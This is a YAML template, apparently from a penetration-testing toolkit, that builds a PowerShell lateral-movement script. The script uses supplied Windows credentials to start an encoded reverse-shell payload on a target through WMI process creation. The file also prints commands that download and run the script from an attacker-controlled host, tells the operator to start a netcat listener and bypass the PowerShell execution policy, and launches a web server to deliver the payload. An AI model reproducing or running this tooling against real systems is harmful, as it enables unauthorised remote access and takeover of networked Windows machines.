metadata:
  filename: lateral-movement-template-WMI-powershell-revshell.yaml
  tags:
  - shell
  - windows
  created: '2025-03-29'
  author: Unknown
content: "echo \"Answer the following with valid user credentials and a target ip.\
  \ A powershell script will be generated. If successful, a revshell can be caught\
  \ at port {{ shell_port }} of your kali.\"; \\\nread --prompt-str \"Target Username:\"\
  \ username; \\\nread --prompt-str \"Target Password:\" password; \\\nread --prompt-str\
  \ \"Target IP:\" target; \\\n\necho \"\\$username = '$username';\" > lateral-movement-wmi.ps1;\
  \ \\\necho \"\\$password = '$password';\" >> lateral-movement-wmi.ps1; \\\necho\
  \ \"\\$secureString = ConvertTo-SecureString \\$password -AsPlaintext -Force;\"\
  \ >> lateral-movement-wmi.ps1; \\\necho \"\\$credential = New-Object System.Management.Automation.PSCredential\
  \ \\$username, \\$secureString;\" >> lateral-movement-wmi.ps1; \\\necho \"\\$Options\
  \ = New-CimSessionOption -Protocol DCOM;\" >> lateral-movement-wmi.ps1; \\\necho\
  \ \"\\$Session = New-Cimsession -ComputerName $target -Credential \\$credential\
  \ -SessionOption \\$Options;\" >> lateral-movement-wmi.ps1; \\\necho \"\\$Command\
  \ = '{{ include('payloads/revshell-windows-powershell-oneliner-base64encoded.yaml')\
  \ }}';\" >> lateral-movement-wmi.ps1; \\\necho \"Invoke-CimMethod -CimSession \\\
  $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =\\\
  $Command}\" >> lateral-movement-wmi.ps1; \\\n\nmkdir -p packstation/outbound; mv\
  \ lateral-movement-wmi.ps1 packstation/outbound/; \\\necho '================================================================';\
  \ \\\necho '                      -----PowerShell-----                      '; \\\
  \necho 'Preparation 1 (start listener): {{ include('scripts/listener-nc.yaml') }}';\
  \ \\\necho 'Without bypass: Open the created file lateral-movement-wmi.ps1 and paste\
  \ in line by line into powershell'; \\\necho 'Preparation 2 (for save to disk only):\
  \ powershell -ep bypass'; \\\necho 'Deliver & save to disk: iwr -uri http://{{ attacker_ip\
  \ }}:{{ delivery_outbound_port }}/lateral-movement-wmi.ps1 -Outfile {{ delivery_path_windows\
  \ }}\\lateral-movement-wmi.ps1'; \\\necho 'Deliver, save to disk & execute: iwr\
  \ -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/lateral-movement-wmi.ps1\
  \ -Outfile {{ delivery_path_windows }}\\lateral-movement-wmi.ps1; {{ delivery_path_windows\
  \ }}\\lateral-movement-wmi.ps1'; \\\necho '================================================================';\
  \ \\\n python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{\
  \ delivery_outbound_port }} -d packstation/outbound\n"
